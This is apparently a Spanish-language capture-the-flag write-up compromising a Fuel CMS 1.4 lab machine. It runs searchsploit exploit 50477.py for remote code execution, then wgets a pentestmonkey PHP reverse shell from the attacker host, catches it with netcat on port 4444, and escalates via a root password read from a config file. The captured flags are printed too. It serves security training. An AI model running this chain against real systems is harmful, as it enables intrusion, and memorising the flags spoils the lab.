# 1) Objetivo

En esta máquina de pentesting web debemos encontrar la flag user.txt y root.txt.

## 2) Reconocimiento y obtener acceso

Lo primero que haremos será usar Nmap para descubrir los puertos abiertos en la máquina y los servicios que corren. Usamos:

```
nmap -sV -A -T4 
```

Mientras se ejecuta nmap, probamos por si existiera un archivo robots.txt y tuviera información interesante. Vemos que nos aparece un directorio llamado /fuel/ el cual no quieren que sea indexado.

![](IMG/Pasted%20image%2020250310220737.png)

Terminado nmap, nos muestra que tenemos abierto el puerto 80, que está corriendo un servidor web con un CMS llamado fuel, y también nos muestra que hay un archivo robots.txt.

![](IMG/Pasted%20image%2020250310220934.png)

Probamos a acceder al directorio /fuel que nos aparece tanto en el archivo robots.txt como en el resultado de nmap, y vemos que hay una pantalla de login, como no tenemos ninguna credencial, poco podemos hacer.

![](IMG/Pasted%20image%2020250310221336.png)

si echamos un vistazo a la pagina principal, encontramos un nombre de usuario y una contraseña para acceder al panel de administración.

![](IMG/Pasted%20image%2020250310221600.png)

probamos a acceder, y podemos sin problema alguno.

![](IMG/Pasted%20image%2020250310221700.png)

Si echamos un vistazo a la documentación, descubrimos que la versión del CMS es la 1.4.

![](IMG/Pasted%20image%2020250310221751.png)

Con esta información, probamos a buscar algún exploit que nos permita obtener acceso en searchsploit (porque de primeras he buscado en metasploit, pero no había ninguno). 

```
searchsploit fuel cms
```

![](IMG/Pasted%20image%2020250310223401.png)

Y descargamos el 50477.py que es un exploit para php.

```
searchsploit -m php/webapps/50477.py
```

![](IMG/Pasted%20image%2020250310233236.png)

Una vez descargado, lo ejecutamos, desde el directorio donde lo hemos descargado.

```
python3 50477.py -u http://10.10.201.54
```

![](IMG/Pasted%20image%2020250311005558.png)

Lo cual nos ha dado una shell en la maquina objetivo, buscaremos la flag de usuario, ya que de momento solo tenemos esos privilegios. Como suponemos que estará en la carpeta home del usuario, primero comprobamos con pwd donde nos encontramos, y luego iremos navegando hasta el directorio home.

![](IMG/Pasted%20image%2020250311005821.png)

Como la shell que tenemos es muy básica, una vez encontremos la ruta donde se encuentra el archivo con la flag, lo abriremos directamente.

![](IMG/Pasted%20image%2020250311010114.png)

**user.txt (flag.txt): 6470e394cbf6dab6a91682cc8585059b**

# 3) Escalada de privilegios

Ya hemos conseguido acceso con permisos de usuario, ahora, trataremos de escalar los privilegios para obtener permisos root. Para hacer esto, usaremos una shell reversa de pentestmonkey que podemos descargar de [aquí](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php). Una vez tenemos descargado el archivo, lo modificaremos para añadir la ip de nuestra máquina atacante y el puerto por el que queremos que se conecte la shell reversa.

![](IMG/Pasted%20image%2020250311011036.png)

Una vez modificado, como tenemos acceso a la máquina con la shell que hicimos con el exploit, vamos a enviarle este archivo usando wget. así que primero tenemos que crear un servidor web, para que la maquina objetivo pueda descargar el archivo, usaremos en nuestra máquina atacante:

```
python3 -m http.server 80
```

![](IMG/Pasted%20image%2020250311011246.png)

Ahora, usando la shell que tenemos de la máquina objetivo, usamos wget para descargar el archivo.

```
wget http://10.8.16.0/php-reverse-shell.php
```

Veremos que se ha descargado correctamente.

![](IMG/Pasted%20image%2020250311011534.png)

Ahora que ya tenemos el archivo en la máquina objetivo, podemos parar el servidor web que habíamos iniciado, y ahora usaremos netcat para poner a la escucha en el puerto 4444 y así poder recibir la shell reversa cuando la ejecutemos.

```
nc -lvnp 4444
```

![](IMG/Pasted%20image%2020250311011741.png)

Con el puerto a la escucha, usamos el navegador para ejecutar el archivo que tenemos en la maquina objetivo.

![](IMG/Pasted%20image%2020250311011910.png)

Y veremos que hemos recibido la shell reversa.

![](IMG/Pasted%20image%2020250311011940.png)

Como esta shell no es interactiva, no podremos hacer root, así que podemos usar python para conseguir una shell bash, así:

```
python -c 'import pty; pty.spawn("/bin/bash")'
```

Y ahora sí, tendremos una shell interactiva.

![](IMG/Pasted%20image%2020250311012142.png)

Ahora, usando "su root", deberíamos poder obtener privilegios de root, pero no tenemos la contraseña de root, así que debemos buscarla. Si recordamos, en la pagina principal había instrucciones para configurar el CMS, y entre esas instrucciones nos indicaba donde estaba el archivo de configuración de la base de datos, así que vamos a echarle un vistazo al archivo para ver si está la contraseña de root.

![](IMG/Pasted%20image%2020250311012539.png)

Navegaremos hasta la ruta que nos indican y abriremos el archivo de configuración, una vez abierto, encontraremos la contraseña de root, la cual es mememe

![](IMG/Pasted%20image%2020250311012945.png)

Todo este proceso, realmente podríamos haberlo hecho antes, pero bueno, en este caso el orden de los factores no altera el producto.

Ahora que ya tenemos la contraseña de root, sí podemos hacer:

```
su root
mememe
```

![](IMG/Pasted%20image%2020250311013309.png)

Y ahora, solo tendremos que buscar la flag y abrir el archivo para encontrar la respuesta.

![](IMG/Pasted%20image%2020250311013423.png)

**Root.txt: b9bbcb33e11b80be759c4e844862482d**